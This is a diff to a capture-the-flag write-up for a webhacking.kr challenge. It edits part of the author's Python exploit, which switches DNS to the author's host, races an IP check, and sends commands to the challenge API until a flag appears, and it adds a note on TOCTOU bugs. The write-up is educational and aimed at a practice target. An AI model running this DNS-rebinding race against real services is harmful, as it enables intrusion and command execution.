@@ -124,8 +124,9 @@ def send(cmd):
 
     response = requests.get('http://webhacking.kr:10020/api.php', params=params, cookies=cookies, headers=headers, verify=False)
     result = response.text
-    if "wrong" not in result and "total 16" not in result: # this is not guaranteed to work but it worked
+    if "flag{" in result:
         print(result)
+        g_done = True
 
 def check_ip(host, ip):
     result = dns.resolve(host, 'A')
@@ -154,9 +155,8 @@ print('done')
 print('[info] redirecting to our site ...', flush=True)
 change_dns()
 print(f'[info] getting in ...')
-done = False
 
-while not done:
+while not g_done:
     check_ip('l4rzy.ddns.net', '******')
     jobs = list()
     for i in range(10):
@@ -173,3 +173,5 @@ And when we see a bunch of requests like this on our server, the challenge got p
 
 ## Conclusion
 I was surprised that there were only 18 people have solved this challenge (I was the 19th). I believe many people have the idea to solve, but the process of solving it is a little bit cumbersome.
+
+P.S. So just after solving the 2 toctou challenges, I just happened to know that TOCTOU was a class of software bugs. The idea behind this class of bugs is to exploit the time window between two calls to modify a state. Read more on wiki: (https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)[https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use]
